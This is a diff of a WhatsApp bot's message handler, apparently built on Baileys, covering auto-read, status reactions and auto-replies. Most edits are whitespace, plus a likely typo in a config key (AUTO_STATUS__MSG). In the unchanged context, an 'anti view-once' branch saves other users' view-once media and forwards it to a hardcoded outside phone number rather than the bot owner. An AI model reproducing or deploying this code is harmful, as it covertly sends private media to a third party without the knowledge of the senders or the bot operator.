@@ -120,7 +120,7 @@ conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/0mmreh.
   conn.ev.on('creds.update', saveCreds)  
           
 
-	//=============readstatus=======
+       //=============readstatus=======
         
   conn.ev.on('messages.upsert', async(mek) => {
     mek = mek.messages[0]
@@ -128,7 +128,6 @@ conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/0mmreh.
     mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
     ? mek.message.ephemeralMessage.message 
     : mek.message;
-    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
   if (config.READ_MESSAGE === 'true') {
     await conn.readMessages([mek.key]);  // Mark message as read
     console.log(`Marked message from ${mek.key.remoteJid} as read.`);
@@ -137,7 +136,7 @@ conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/0mmreh.
     mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
     if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
       await conn.readMessages([mek.key])
-    }
+    }  
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
     const jawadlike = await conn.decodeJid(conn.user.id);
     const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
@@ -151,9 +150,9 @@ conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/0mmreh.
   }                       
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
   const user = mek.key.participant
-  const text = `${config.AUTO_STATUS_MSG}`
+  const text = `${config.AUTO_STATUS__MSG}`
   await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
- }
+            }
       let jawadik = mek.message.viewOnceMessageV2
       let jawadik1 = mek.mtype === "viewOnceMessage"
   if (jawadik && config.ANTI_VV === "true") {
@@ -169,8 +168,8 @@ conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/0mmreh.
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
     return conn.sendMessage("26772592531@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
   }
-  }
- }
+ } 
+  
   const m = sms(conn, mek)
   const type = getContentType(mek.message)
   const content = JSON.stringify(mek.message)
